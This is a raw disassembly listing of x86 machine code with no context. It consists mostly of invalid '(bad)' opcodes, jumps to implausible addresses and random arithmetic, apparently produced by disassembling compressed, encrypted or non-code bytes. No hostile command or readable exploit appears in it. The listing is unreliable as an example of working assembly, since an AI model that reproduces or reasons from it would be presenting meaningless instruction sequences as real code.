  40e781:	js     0x40e783
  40e783:	daa    
  40e784:	or     ecx,ebp
  40e786:	or     al,0xf1
  40e788:	(bad)  
  40e789:	fld    QWORD PTR [eax-0x5bef8ebb]
  40e78f:	jp     0x40e805
  40e791:	sbb    eax,0xe8717548
  40e796:	add    esi,DWORD PTR [ecx]
  40e798:	or     DWORD PTR [edx-0x2],ebp
  40e79b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e79c:	or     DWORD PTR [ebp-0x2f],edi
  40e79f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e7a0:	(bad)  
  40e7a1:	lock and BYTE PTR ds:0x5e800071,0x9
  40e7a9:	jmp    0x263e58ba
  40e7ae:	aam    0x87
  40e7b0:	(bad)  
  40e7b1:	lock imul esp,edx,0x3b
  40e7b5:	jmp    0xa848bfbd
  40e7ba:	mov    eax,DWORD PTR [esi+0x1e841260]
  40e7c0:	push   es
  40e7c1:	xor    al,0x28
  40e7c3:	ja     0x40e7ce
  40e7c5:	jmp    0xf675369c
  40e7ca:	add    esi,DWORD PTR [ecx]
  40e7cc:	add    BYTE PTR [ecx+0x38d91df8],ch
  40e7d2:	ins    BYTE PTR es:[edi],dx
  40e7d3:	(bad)
  40e7d6:	jg     0x40e781
  40e7d8:	into   
  40e7d9:	xchg   esp,eax
  40e7da:	fld    QWORD PTR [ecx-0x7c88048c]
  40e7e0:	popa   
  40e7e1:	pop    esi
  40e7e2:	rcr    BYTE PTR [edi],1
  40e7e4:	je     0x40e7e5
  40e7e6:	add    DWORD PTR [eax],0xb17fc92f
  40e7ec:	xor    bh,dh
  40e7ee:	shl    BYTE PTR [esi+0x8],1
  40e7f1:	jl     0x40e7da
  40e7f3:	test   eax,0x62fe72ee
  40e7f8:	call   0x73614274
  40e7fd:	add    BYTE PTR [eax],al
  40e7ff:	pushf  
  40e800:	mov    ebx,0x7925825f
  40e805:	ficom  WORD PTR [esi+0x6a]
  40e808:	jo     0x40e7af
  40e80a:	dec    edx
  40e80b:	test   al,0x32
  40e80d:	or     DWORD PTR [ebp-0x11],esi
  40e810:	out    0xd5,eax
  40e812:	enter  0x212b,0x9
  40e816:	lea    ebp,[edx+eax*2+0x3e94fec4]
  40e81d:	popa   
  40e81e:	mov    eax,0xa732798
  40e823:	sub    DWORD PTR [esi],ebp
  40e825:	lea    ebp,[eax+ebp*8]
  40e828:	xor    cl,BYTE PTR [ecx]
  40e82a:	sub    DWORD PTR [esi+ecx*1+0x74],0x432f9fe
  40e832:	xor    esi,0x35
  40e835:	or     DWORD PTR [eax],eax
  40e837:	(bad)  
  40e838:	jns    0x40e8a9
  40e83a:	(bad)  
  40e83b:	push   esp
  40e83c:	in     eax,dx
  40e83d:	imul   eax,DWORD PTR [ebx+0x1c],0xffffffe6
  40e841:	jb     0x40e84d
  40e843:	test   eax,0xe8038e2f
  40e848:	xor    cl,BYTE PTR [ecx]
  40e84a:	push   DWORD PTR [eax+eax*1]
  40e84d:	mov    cl,0x72
  40e84f:	je     0x40e7f2
  40e851:	pop    edx
  40e852:	mov    cl,0x66
  40e854:	sub    BYTE PTR ds:0xb797d261,dh
  40e85a:	jb     0x40e7e4
  40e85c:	and    al,0xa1
  40e85e:	jae    0x40e8d4
  40e860:	add    BYTE PTR [ebx+esi*8-0x61bf078d],ch
  40e867:	gs inc ecx
  40e869:	or     bh,bl
  40e86b:	mov    esi,0x87f39ffe
  40e870:	inc    ebp
  40e871:	pusha  
  40e872:	repz jae 0x40e871
  40e875:	pop    edi
  40e876:	jno    0x40e86e
  40e878:	push   0x3f6b46
  40e87d:	jo     0x40e838
  40e87f:	cld    
  40e880:	jmp    FWORD PTR [edi-0x7b]
  40e883:	inc    ebx
  40e884:	in     al,0x4b
  40e886:	or     esp,ebp
  40e888:	add    bh,cl
  40e88a:	mov    ah,BYTE PTR [edi-0x7cf92800]
  40e890:	jge    0x40e8b2
  40e892:	push   es
  40e893:	je     0x40eed8
  40e899:	dec    ebx
  40e89a:	or     esp,esp
  40e89c:	add    BYTE PTR [edi-0x67ff6c76],cl
  40e8a2:	push   es
  40e8a3:	push   DWORD PTR [ebp+0x40]
  40e8a6:	fisub  WORD PTR [edx+0x36]
  40e8a9:	mov    BYTE PTR [esi],al
  40e8ab:	mov    esi,DWORD PTR [ebp+0x30]
  40e8ae:	jg     0x40e8ac
  40e8b0:	mov    eax,DWORD PTR [eax]
  40e8b2:	rcl    dh,0xe7
  40e8b5:	push   ecx
  40e8b6:	arpl   WORD PTR [ebx],sp
  40e8b8:	lods   ax,WORD PTR ds:[esi]
  40e8ba:	sbb    al,0x3d
  40e8bc:	jb     0x40e8c6
  40e8be:	cmp    al,0x2e
  40e8c0:	ja     0x40e8c6
  40e8c2:	cmp    al,0x3d
  40e8c4:	jmp    0x40e8ca
  40e8c6:	sub    al,0x46
  40e8c8:	add    cl,BYTE PTR [edx]
  40e8ca:	enter  0x2e88,0x72
  40e8ce:	push   edx
  40e8cf:	xchg   dl,bh
  40e8d1:	cmp    DWORD PTR [edi],esp
  40e8d3:	or     al,BYTE PTR [eax+0x4e158ec]
  40e8d9:	xor    BYTE PTR [ecx],0x8c
  40e8dc:	ret    0xf57f
  40e8df:	gs inc edx
  40e8e1:	fild   QWORD PTR ds:0x68a94676
  40e8e7:	ja     0x40e932
  40e8e9:	je     0x40e8d2
  40e8eb:	sbb    BYTE PTR [ebx-0x91d12b4],cl
  40e8f1:	out    0xb6,eax
  40e8f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e8f4:	(bad)  
  40e8f5:	(bad)  
  40e8f6:	je     0x40e8c0
  40e8f8:	add    eax,DWORD PTR [eax]
  40e8fa:	xor    DWORD PTR [eax-0x73],esp
  40e8fd:	inc    esp
  40e8fe:	add    eax,0x5b00e8b0
  40e903:	pusha  
  40e904:	call   0xe8a13208
  40e909:	jmp    DWORD PTR [ebp-0x31b0a15c]
  40e90f:	pop    esp
  40e910:	scas   al,BYTE PTR es:[edi]
  40e911:	dec    edx
  40e912:	jo     0x40e974
  40e914:	pop    es
  40e915:	rol    BYTE PTR [eax],0x45
  40e918:	ds jg  0x40e997
  40e91b:	fstp   DWORD PTR [edi-0xa]
  40e91e:	sbb    ebp,DWORD PTR [esi+0x1cfe569c]
  40e924:	sub    BYTE PTR [ebp+0x74],bh
  40e927:	xchg   ebp,eax
  40e928:	jb     0x40e91f
  40e92a:	jmp    0x40e8c2
  40e92c:	hlt    
  40e92d:	or     ch,al
  40e92f:	int3   
  40e930:	arpl   WORD PTR [ebx-0x2],di
  40e933:	xchg   ah,dl
  40e935:	pop    ebx
  40e936:	out    0x88,eax
  40e938:	sbb    al,0x4
  40e93a:	add    BYTE PTR [esi-0x2c],dh
  40e93d:	outs   dx,DWORD PTR ds:[esi]
  40e93e:	out    0x68,eax
  40e940:	and    eax,0x3466fe7d
  40e945:	ins    BYTE PTR es:[edi],dx
  40e946:	out    0x60,eax
  40e948:	xor    eax,0x3456fe7d
  40e94d:	push   0x7d2558e7
  40e952:	(bad)  
  40e953:	mov    ah,0x8
  40e955:	sub    al,0x74
  40e957:	out    dx,al
  40e958:	pusha  
  40e959:	add    bl,dl
  40e95b:	aaa    
  40e95c:	jno    0x40e993
  40e95e:	fdivp  st(1),st
  40e960:	dec    ebx
  40e961:	fadd   QWORD PTR [ebx]
  40e963:	jl     0x40e8e9
  40e965:	xchg   esp,eax
  40e966:	xor    dl,0x6d
  40e969:	adc    al,BYTE PTR [ebx+ecx*4]
  40e96c:	(bad)  
  40e96d:	jne    0x40e965
  40e96f:	ss popa 
  40e971:	call   0x6fb1f141
  40e976:	(bad)  
  40e977:	cli    
  40e978:	jo     0x40e94d
  40e97a:	or     eax,DWORD PTR [eax]
  40e97c:	or     DWORD PTR [esp+edx*2],ebp
  40e97f:	jl     0x40e970
  40e981:	jecxz  0x40e966
  40e983:	imul   esi,DWORD PTR [eax+eax*8],0x45
  40e987:	jl     0x40e9b4
  40e989:	dec    ecx
  40e98a:	mov    ah,0x1d
  40e98c:	and    ecx,0x90e4fc0
  40e992:	rol    DWORD PTR [ebx],0x31
  40e995:	pusha  
  40e996:	data16 jmp 0x40e933
  40e999:	call   0x70a1ed45
  40e99e:	fwait
  40e99f:	or     ebx,DWORD PTR [ecx-0x58836897]
  40e9a5:	popa   
  40e9a6:	pop    esp
  40e9a7:	leave  
  40e9a8:	lahf   
  40e9a9:	jo     0x40e9a8
  40e9ab:	cmc    
  40e9ac:	call   0xa108:0x990b7b70
  40e9b3:	jl     0x40e93c
  40e9b5:	inc    edx
  40e9b6:	stos   BYTE PTR es:[edi],al
  40e9b7:	add    BYTE PTR [ecx],dh
  40e9b9:	(bad)  
  40e9ba:	jno    0x40ea24
  40e9bc:	mov    bl,0x45
  40e9be:	aam    0xd3
  40e9c0:	fmul   DWORD PTR [eax]
  40e9c2:	inc    ebx
  40e9c3:	ret    0xf667
  40e9c6:	lock imul ecx,DWORD PTR [eax-0x56844238],0xffffffc6
  40e9ce:	push   DWORD PTR [esi+edi*4+0x6c21562d]
  40e9d5:	jo     0x40ea55
  40e9d7:	out    0x32,al
  40e9d9:	cmc    
  40e9da:	push   eax
  40e9db:	adc    esp,eax
  40e9dd:	out    0x40,al
  40e9df:	jmp    0xcca8ece4
  40e9e4:	xlat   BYTE PTR ds:[ebx]
  40e9e5:	xor    cl,BYTE PTR [ecx]
  40e9e7:	or     ebp,DWORD PTR [ecx-0x1114f5df]
  40e9ed:	or     ch,BYTE PTR [ecx+0x66]
  40e9f0:	sub    BYTE PTR ds:0x432de7d8,dh
  40e9f6:	or     DWORD PTR [eax],eax
  40e9f8:	bnd jb 0x40e9f7
  40e9fb:	and    dh,BYTE PTR [esi+0x5654008a]
  40ea01:	push   0x3
  40ea03:	rcl    ch,0x45
  40ea06:	fldenv [edi-0x17]
  40ea09:	xor    ah,BYTE PTR [eax-0x43]
  40ea0c:	shl    DWORD PTR [edx-0x19],1
  40ea0f:	inc    eax
  40ea10:	jmp    0xe1b558f7
  40ea15:	pop    edx
  40ea16:	sbb    BYTE PTR [ebx+0x26],dh
  40ea19:	cmp    ch,BYTE PTR [eax+0x20]
  40ea1c:	mov    bl,0x3b
  40ea1e:	outs   dx,DWORD PTR ds:[esi]
  40ea1f:	sti    
  40ea20:	(bad)  
  40ea22:	mov    al,0xfe
  40ea24:	push   cs
  40ea25:	sub    ch,BYTE PTR [edi-0xf]
  40ea28:	push   edi
  40ea29:	pop    ebp
  40ea2a:	or     BYTE PTR [ebp+0x4e],dh
  40ea2d:	sbb    dh,ch
  40ea2f:	sti    
  40ea30:	test   BYTE PTR [ecx+0x7267e807],0x6e
  40ea37:	inc    BYTE PTR [esi-0x14]
  40ea3a:	dec    ecx
  40ea3b:	add    ebp,ecx
  40ea3d:	popa   
  40ea3e:	sub    bl,0x68
  40ea41:	cs inc eax
  40ea43:	test   dh,0x0
  40ea46:	jmp    0x40eac4
  40ea48:	inc    esp
  40ea49:	add    BYTE PTR [ebx+ebx*2-0x3],dh
  40ea4d:	jne    0x40eac7
  40ea4f:	bnd jae 0x40ea5e
  40ea52:	jo     0x40ea64
  40ea54:	add    BYTE PTR ss:[eax-0x2],bl
  40ea58:	mov    edi,0x238cd0f
  40ea5d:	add    BYTE PTR [eax-0x36],cl
  40ea60:	inc    ebx
  40ea61:	clc    
  40ea62:	sbb    BYTE PTR [ebx],cl
  40ea64:	add    BYTE PTR [eax],al
  40ea66:	iret   
  40ea67:	dec    ecx
  40ea68:	out    dx,al
  40ea69:	dec    DWORD PTR [edi]
  40ea6b:	or     eax,DWORD PTR [eax]
  40ea6d:	push   0x8
  40ea6f:	pop    ebp
  40ea70:	(bad)  
  40ea71:	imul   ebx,DWORD PTR [eax],0x4d8cfe5d
  40ea77:	cmc    
  40ea78:	dec    esi
  40ea79:	lea    ecx,[ebp+0x57fff5fa]
  40ea7f:	pop    edx
  40ea80:	std    
  40ea81:	jne    0x40ea03
  40ea83:	repz jae 0x40ea82
  40ea86:	jo     0x40ea6b
  40ea88:	xor    eax,DWORD PTR [eax]
  40ea8a:	enter  0xbfff,0x74
  40ea8e:	int    0xdd
  40ea90:	test   BYTE PTR [ecx],0xd8
  40ea93:	or     ch,BYTE PTR [eax-0x52]
  40ea96:	nop
  40ea97:	inc    ebp
  40ea98:	(bad)  
  40ea99:	(bad)  
  40ea9a:	popf   
  40ea9b:	sbb    ch,al
  40ea9d:	inc    eax
  40ea9e:	test   ebx,esi
  40eaa0:	std    
  40eaa1:	push   eax
  40eaa2:	adc    ebx,edx
  40eaa4:	mov    eax,DWORD PTR [ebp-0x204b8]
  40eaaa:	add    BYTE PTR [eax-0x3acf19ac],bh
  40eab0:	repz std 
  40eab2:	mov    DWORD PTR ds:0x97fff5e6,ebx
  40eab8:	jecxz  0x40ea3e
  40eaba:	dec    ecx
  40eabb:	xchg   edi,eax
  40eabc:	lock mov eax,DWORD PTR [ebp+0x5c]
  40eac0:	push   ebp
  40eac1:	dec    si
  40eac3:	xor    eax,ecx
  40eac5:	ret    0x67ff
  40eac8:	xchg   ebp,eax
  40eac9:	neg    BYTE PTR [bp+0x47]
  40eacd:	js     0x40eb43
  40eacf:	and    eax,0x4e4b8058
  40ead4:	mov    bh,0x8a
  40ead6:	test   BYTE PTR [ecx-0x49],ch
  40ead9:	js     0x40ead9
  40eadb:	retf   
  40eadc:	pop    edi
  40eadd:	jmp    0xe4ff:0x420c956
  40eae4:	xor    DWORD PTR [eax-0x2],0x26
  40eae8:	jg     0x40ead8
  40eaea:	or     ecx,DWORD PTR [ecx]
  40eaec:	adc    al,0xc8
  40eaee:	(bad)  
  40eaef:	push   ss
  40eaf0:	stc    
  40eaf1:	jle    0x40eada
  40eaf3:	push   es
  40eaf4:	idiv   DWORD PTR [eax+0x69]
  40eaf7:	xor    DWORD PTR [eax],ecx
  40eaf9:	out    0x67,al
  40eafb:	jo     0x40eb5d
  40eafd:	ja     0x40eab3
  40eaff:	add    eax,0xeefe78d7
  40eb04:	dec    esp
  40eb05:	push   es
  40eb06:	call   0xfeb8778b
  40eb0b:	test   al,0xdc
  40eb0d:	pop    edi
  40eb0e:	test   BYTE PTR [eax],0xd6
  40eb11:	xchg   DWORD PTR cs:[ebp+eiz*8+0x61fe792e],eax
  40eb19:	dec    eax
  40eb1a:	cld    
  40eb1b:	addr16 jo 0x40eb7e
  40eb1e:	ja     0x40ead4
  40eb20:	lds    edx,FWORD PTR [esi]
  40eb22:	jns    0x40eb22
  40eb24:	scas   al,BYTE PTR es:[edi]
  40eb25:	mov    WORD PTR [esi],es
  40eb27:	call   0xfeb8778c
  40eb2c:	sub    ah,BYTE PTR [eax]
  40eb2e:	lock sbb BYTE PTR [edx-0x7109afd4],dh
  40eb35:	jbe    0x40eb35
  40eb37:	je     0x40eb5a
  40eb39:	pop    edi
  40eb3a:	xor    cl,BYTE PTR [edi+0x70c908b4]
  40eb40:	ja     0x40ebaf
  40eb42:	cmp    BYTE PTR [esp+ebp*2-0x40],ch
  40eb46:	aad    0x78
  40eb48:	pop    ebx
  40eb49:	adc    al,0xe2
  40eb4b:	inc    ebx
  40eb4c:	loop   0x40eb54
  40eb4e:	sbb    DWORD PTR [eax+eiz*2-0x40],ebp
  40eb52:	mov    ebp,0xc8837778
  40eb57:	jo     0x40eba0
  40eb59:	ins    DWORD PTR es:[edi],dx
  40eb5a:	rol    DWORD PTR [ebx],cl
  40eb5c:	xor    DWORD PTR [ecx],ecx
  40eb5e:	adc    eax,DWORD PTR [ecx+ecx*8]
  40eb61:	fist   WORD PTR [eax]
  40eb63:	ret    
  40eb64:	cs ins BYTE PTR es:[edi],dx
  40eb66:	pop    ebx
  40eb67:	addr16 pop ds
  40eb69:	ins    DWORD PTR es:[edi],dx
  40eb6a:	lea    edi,[eax-0x5b]
  40eb6d:	std    
  40eb6e:	nop
  40eb6f:	ins    BYTE PTR es:[edi],dx
  40eb70:	imul   ebp,DWORD PTR [ebp+edi*2-0x76],0x0
  40eb75:	mov    ch,0x4d
  40eb77:	jge    0x40ebf1
  40eb79:	pop    es
  40eb7a:	loopne 0x40eb64
  40eb7c:	jmp    0x40eb33
  40eb7e:	loope  0x40eb27
  40eb80:	add    esi,esi
  40eb82:	mov    dh,0x4c
  40eb84:	jo     0x40eb75
  40eb86:	ins    BYTE PTR es:[edi],dx
  40eb87:	push   ebp
  40eb88:	out    dx,al
  40eb89:	cmp    ah,BYTE PTR [ecx+0x38]
  40eb8c:	int3   
  40eb8d:	fild   QWORD PTR [edi+ebp*2+0x7e]
  40eb91:	out    0x74,al
  40eb93:	cmp    eax,0x10aeb378
  40eb98:	jo     0x40eb61
  40eb9a:	ins    BYTE PTR es:[edi],dx
  40eb9b:	call   0xe8d6a0a8
  40eba0:	add    esi,DWORD PTR [ecx]
  40eba2:	loope  0x40ec1c
  40eba4:	jmp    0x40eb97
  40eba6:	or     BYTE PTR [esi+edi*4-0x5e],ah
  40ebaa:	(bad)  ds:0x57486ae
  40ebb0:	js     0x40eb40
  40ebb2:	sti    
  40ebb3:	jp     0x40ec2d
  40ebb5:	pop    DWORD PTR [eax]
  40ebb7:	add    BYTE PTR [ecx],ch
  40ebb9:	xchg   esi,eax
  40ebba:	lock sub BYTE PTR [esi+ecx*1+0x6c],0x72
  40ebc0:	pop    edi
  40ebc1:	mov    dl,0xad
  40ebc3:	jecxz  0x40eb9b
  40ebc5:	out    0x6a,al
  40ebc7:	call   FWORD PTR [eax+ebx*2-0x79]
  40ebcb:	mov    esp,0xfe6acec1
  40ebd0:	jmp    0xd9a8d41b
  40ebd5:	xor    bl,BYTE PTR [ebp+edi*4-0x4a]
  40ebd9:	add    BYTE PTR [eax+0x4],al
  40ebdc:	call   0xfeac5db1
  40ebe1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ebe2:	and    BYTE PTR [esi+esi*8-0x62],0xa6
  40ebe7:	imul   esi,DWORD PTR [ecx+eiz*8-0x66],0xffffffdd
  40ebec:	inc    esp
  40ebed:	mov    fs,WORD PTR [esi-0x79724b95]
  40ebf3:	imul   edi,esi,0x7e
  40ebf6:	add    BYTE PTR [eax+ebp*8],al
  40ebf9:	push   ss
  40ebfa:	lock push 0xfffffffe
  40ebfd:	outs   dx,BYTE PTR ds:[esi]
  40ebfe:	add    BYTE PTR [eax-0x2],bh
  40ec01:	pushf  
  40ec02:	push   ebp
  40ec03:	jae    0x40ec03
  40ec05:	pop    esi
  40ec06:	data16 cmc 
  40ec08:	pop    es
  40ec09:	inc    ecx
  40ec0a:	adc    eax,esi
  40ec0c:	dec    BYTE PTR [esi+0x66]
  40ec0f:	mov    ch,0xdf
  40ec11:	ds pop esi
  40ec13:	imul   edi,esi,0xffffffb4
  40ec16:	cmp    ah,BYTE PTR [ecx-0x23]
  40ec19:	lods   eax,DWORD PTR ds:[esi]
  40ec1a:	aas    
  40ec1b:	imul   edi,esi,0x74
  40ec1e:	pop    ecx
  40ec1f:	jae    0x40ec1f
  40ec21:	es ds cmc 
  40ec24:	pop    es
  40ec25:	adc    DWORD PTR [ebx-0x3a],esp
  40ec28:	(bad)  
  40ec29:	push   ss
  40ec2a:	push   ds
  40ec2b:	mov    ch,0xcf
  40ec2d:	push   ss
  40ec2e:	es imul edi,esi,0x0
  40ec32:	adc    eax,0xd524e800
  40ec37:	repnz std 
  40ec39:	inc    DWORD PTR [ebp-0x33]
  40ec3c:	cmc    
  40ec3d:	inc    DWORD PTR [eax]
  40ec3f:	(bad)  
  40ec40:	fild   WORD PTR [eax+ecx*2]
  40ec43:	(bad)  
  40ec44:	repnz std 
  40ec46:	mov    ch,0x80
  40ec48:	(bad)  
  40ec4a:	push   DWORD PTR [eax-0x12]
  40ec4d:	inc    ebp
  40ec4e:	jmp    FWORD PTR [edi-0xe]
  40ec51:	mov    bl,0xdc
  40ec53:	xchg   edi,eax
  40ec54:	repnz std 
  40ec56:	call   0x3e96e3
  40ec5b:	jg     0x40ec15
  40ec5d:	loop   0x40ec56
  40ec5f:	(bad)  
  40ec60:	repnz out 0xe5,al
  40ec63:	pop    es
  40ec64:	hlt    
  40ec65:	std    
  40ec66:	inc    DWORD PTR [ebp-0x40000a2a]
  40ec6c:	(bad)  
  40ec6e:	inc    edi
  40ec6f:	scas   eax,DWORD PTR es:[edi]
  40ec70:	repz std 
  40ec72:	mov    ch,0xbc
  40ec74:	(bad)  
  40ec76:	dec    DWORD PTR [edi+0x5ff0a79]
  40ec7c:	jmp    edi
  40ec7e:	(bad)  
  40ec7f:	(bad)  
  40ec80:	repz std 
  40ec82:	call   DWORD PTR [ebp-0x70000a1e]
  40ec88:	fidivr WORD PTR [edi+eax*2+0x45fdf37f]
  40ec8f:	sbb    ch,0xd8
  40ec92:	std    
  40ec93:	outs   dx,DWORD PTR ds:[esi]
  40ec94:	repz std 
  40ec96:	jne    0x40eca4
  40ec98:	(bad)  
  40ec9a:	xor    ebx,eax
  40ec9c:	push   es
  40ec9d:	leave  
  40ec9e:	ret    0x6dc
  40eca1:	push   ebp
  40eca2:	mov    eax,DWORD PTR [eax]
  40eca4:	sbb    al,0x87
  40eca6:	ret    0x1de4
  40eca9:	dec    ecx
  40ecaa:	cli    
  40ecab:	push   eax
  40ecac:	xor    DWORD PTR [eax+0x5ff0683b],ecx
  40ecb2:	jmp    0x4ff:0x2a10ef9
  40ecb9:	pop    esp
  40ecba:	push   0xffffffa5
  40ecbc:	sti    
  40ecbd:	jb     0x40ed33
  40ecbf:	or     dh,BYTE PTR [ecx-0xc]
  40ecc2:	jmp    0x78269f16
  40ecc7:	add    esp,esp
  40ecc9:	sub    dh,BYTE PTR [ebp+0x2f]
  40eccc:	mov    dh,0x1d
  40ecce:	jl     0x40ec50
  40ecd0:	fcom   QWORD PTR [edi+0x6f]
  40ecd3:	add    BYTE PTR [ecx],dh
  40ecd5:	pusha  
  40ecd6:	in     al,dx
  40ecd7:	push   es
  40ecd8:	jbe    0x40ecff
  40ecda:	jl     0x40eccf
  40ecdc:	xor    BYTE PTR [eax+0x2],ah
  40ecdf:	jmp    0x40ecd4
  40ece1:	call   0x40ec:0x1ec9f7ee
  40ece8:	xor    ebp,ebx
  40ecea:	mov    esi,0xee8881e3
  40ecef:	xor    dh,BYTE PTR [ecx]
  40ecf1:	pusha  
  40ecf2:	jg     0x40ecb7
  40ecf4:	and    eax,0x748d0416
  40ecf9:	test   bl,dl
  40ecfb:	addr16 or edi,ebx
  40ecfe:	ret    0xffff
  40ed01:	je     0x40ed09
  40ed03:	call   0xfeb4a35c
  40ed08:	add    BYTE PTR [edx],bh
  40ed0a:	and    al,dh
  40ed0c:	adc    eax,DWORD PTR [ecx-0x31fffeb8]
  40ed12:	jns    0x40ece7
  40ed14:	(bad)  
  40ed15:	pop    esp
  40ed16:	js     0x40ed82
  40ed18:	ds pop esp
  40ed1a:	sub    esi,DWORD PTR [ebp-0x19]
  40ed1d:	adc    al,0x9b
  40ed1f:	jae    0x40ed1f
  40ed21:	mov    esi,0x34827a8c
  40ed26:	or     DWORD PTR [ecx],esp
  40ed28:	add    al,0x24
  40ed2a:	mov    cl,0x10
  40ed2c:	adc    eax,0x4b1569ee
  40ed31:	jo     0x40ed33
  40ed33:	jmp    0x699d9906
  40ed38:	inc    eax
  40ed39:	mov    bl,dh
  40ed3b:	call   0x7baadd29
  40ed40:	or     ecx,DWORD PTR [ecx+0x7774a4c7]
  40ed46:	jg     0x40ed73
  40ed48:	js     0x40ed20
  40ed4a:	adc    BYTE PTR [ecx-0x3d],dl
  40ed4d:	pushw  0x1b
  40ed50:	push   edx
  40ed51:	test   bh,0xe8
  40ed54:	je     0x40ed33
  40ed56:	add    cl,dl
  40ed58:	jae    0x40eda4
  40ed5a:	imul   edi,DWORD PTR [ebp+0x27e11eeb],0xe906c904
  40ed64:	add    esi,DWORD PTR [ecx+0x190c1b69]
  40ed6a:	dec    eax
  40ed6b:	pushf  
  40ed6c:	je     0x40ed6e
  40ed6e:	daa    
  40ed6f:	imul   ebx,ebx,0xe8ca7651
  40ed75:	je     0x40ed14
  40ed77:	adc    DWORD PTR [ecx+0x7d690e2a],edx
  40ed7d:	jmp    0x40edaf
  40ed7f:	or     ecx,ebp
  40ed81:	cmp    edi,0xffffffde
  40ed84:	loopne 0x40edf1
  40ed86:	sbb    ch,BYTE PTR [eax+0x65]
  40ed89:	je     0x40ed7a
  40ed8b:	ficomp WORD PTR [esp+esi*2+0x5d]
  40ed8f:	adc    DWORD PTR [ecx+0x3a],eax
  40ed92:	jne    0x40edfc
  40ed94:	dec    ebp
  40ed95:	dec    edx
  40ed96:	lock or eax,0x75bbcee9
  40ed9c:	imul   edi,DWORD PTR [edi],0x9dffbfea
  40eda2:	enter  0x6868,0xa1
  40eda6:	cmp    eax,0x91107dd
  40edab:	retf   
  40edac:	(bad)  
  40edad:	push   ds
  40edae:	mov    ebx,0x676afbcd
  40edb3:	cdq    
  40edb4:	dec    edx
  40edb5:	test   al,0x32
  40edb7:	or     DWORD PTR [edi],ecx
  40edb9:	ins    DWORD PTR es:[edi],dx
  40edba:	test   DWORD PTR [eax],0x25b1e900
  40edc0:	mov    ah,0xa2
  40edc2:	jae    0x40ee2c
  40edc4:	(bad)  
  40edc5:	fdivrp st(6),st
  40edc7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40edc8:	add    cl,ch
  40edca:	xor    cl,BYTE PTR [esp+edi*1-0x365963]
  40edd1:	call   0xb2ce20d6
  40edd6:	call   0x4c3f70d
  40eddb:	inc    ecx
  40eddc:	rol    DWORD PTR [eax-0x17],cl
  40eddf:	xor    bl,BYTE PTR [eax]
  40ede1:	test   BYTE PTR [edi+0x6a000934],cl
  40ede7:	add    BYTE PTR [ecx+0x935284a],cl
  40eded:	pcmpgtw mm6,QWORD PTR [eax+ecx*1+0x24b7e900]
  40edf5:	test   BYTE PTR [edx],ah
  40edf7:	in     al,dx
  40edf8:	addr16 (bad) 
  40edfa:	div    BYTE PTR [esi+0x32e90093]
  40ee00:	mov    WORD PTR [ecx+eiz*2],?
  40ee03:	mov    esi,0x33e8ffc8
  40ee08:	lea    edi,[esi-0x18]
  40ee0b:	xor    cl,BYTE PTR [ecx]
  40ee0d:	sbb    DWORD PTR [edx*4+0x32e940d2],0x18
  40ee15:	test   bl,bl
  40ee17:	sub    eax,0xe0000009
  40ee1c:	and    DWORD PTR [esi+0x41],0xffffffd8
  40ee20:	inc    ebp
  40ee21:	(bad)  
  40ee22:	(bad)  
  40ee23:	fstp   QWORD PTR [ebx-0x1b37beb7]
  40ee29:	inc    ebx
  40ee2a:	clc    
  40ee2b:	sbb    ebx,DWORD PTR [edx-0xa]
  40ee2e:	add    BYTE PTR [edi-0x77fea971],dl
  40ee34:	or     ebp,DWORD PTR [ebx]
  40ee36:	test   BYTE PTR [eax],0xde
  40ee39:	fidiv  DWORD PTR [ebx-0x8]
  40ee3c:	aaa    
  40ee3d:	add    dh,BYTE PTR [ebx+ecx*2-0xf74f427]
  40ee44:	xchg   ebx,eax
  40ee45:	loope  0x40eeba
  40ee47:	add    eax,0x12331
  40ee4c:	pop    eax
  40ee4d:	out    0x54,al
  40ee4f:	or     al,0xe3
  40ee51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ee52:	mov    ax,WORD PTR [edx]
  40ee55:	imul   eax,DWORD PTR [edi-0x29983b3],0xf8dc0f
  40ee5f:	add    BYTE PTR [eax-0x3c],bl
  40ee62:	or     al,0x1
  40ee64:	dec    eax
  40ee65:	or     ebp,DWORD PTR [eax-0x55]
  40ee68:	lock dec ebp
  40ee6a:	(bad)  
  40ee6b:	dec    BYTE PTR [edi]
  40ee6d:	ret    
  40ee6e:	xor    al,0x31
  40ee70:	sbb    BYTE PTR [ebx],cl
  40ee72:	or     eax,eax
  40ee74:	pop    ss
  40ee75:	xchg   edx,eax
  40ee76:	repnz add BYTE PTR [eax],cl
  40ee79:	or     eax,DWORD PTR [ebx+0xf0b007f]
  40ee7f:	test   BYTE PTR [edx-0x78fffff6],ah
  40ee85:	arpl   WORD PTR [esi],ax
  40ee87:	call   0x3e4033
  40ee8c:	popa   
  40ee8d:	push   ecx
  40ee8e:	out    dx,al
  40ee8f:	(bad)  
  40ee90:	jmp    DWORD PTR [edx-0x3]
  40ee93:	jne    0x40eec6
  40ee95:	shl    BYTE PTR [ecx+0x76],0x25
  40ee99:	enter  0x4607,0x0
  40ee9d:	into   
  40ee9e:	iret   
  40ee9f:	fidiv  DWORD PTR [ecx+ebx*2+0x44ff02b1]
  40eea6:	and    BYTE PTR [ebx-0x3],bl
  40eea9:	add    DWORD PTR [eax+0x2],esi
  40eeac:	or     esi,DWORD PTR [ecx+0x5f]
  40eeaf:	xchg   DWORD PTR [ebx+0x6a027031],esi
  40eeb5:	xor    ebp,ebp
  40eeb7:	(bad)  
  40eeb8:	out    0x1,eax
  40eeba:	(bad)
  40eebd:	loope  0x40ef38
  40eebf:	add    ch,BYTE PTR [edx+0x31]
  40eec2:	jle    0x40ef35
  40eec4:	adc    al,0xbd
  40eec6:	stos   DWORD PTR es:[edi],eax
  40eec7:	ret    
  40eec8:	jmp    FWORD PTR [ebx]
  40eeca:	xor    BYTE PTR [edx],al
  40eecc:	test   dh,al
  40eece:	jo     0x40eed2
  40eed0:	add    BYTE PTR [ebp+ebp*1-0x3aa1b098],dh
  40eed7:	pop    ebx
  40eed8:	(bad)  
  40eed9:	fsub   QWORD PTR [ebx+0x1acd1470]
  40eedf:	ret    
  40eee0:	(bad)  
  40eee1:	cmp    esi,DWORD PTR [eax+0x35ac77f7]
  40eee7:	fs dec edi
  40eee9:	retf   
  40eeea:	outs   dx,DWORD PTR ds:[esi]
  40eeeb:	fdiv   st(7),st
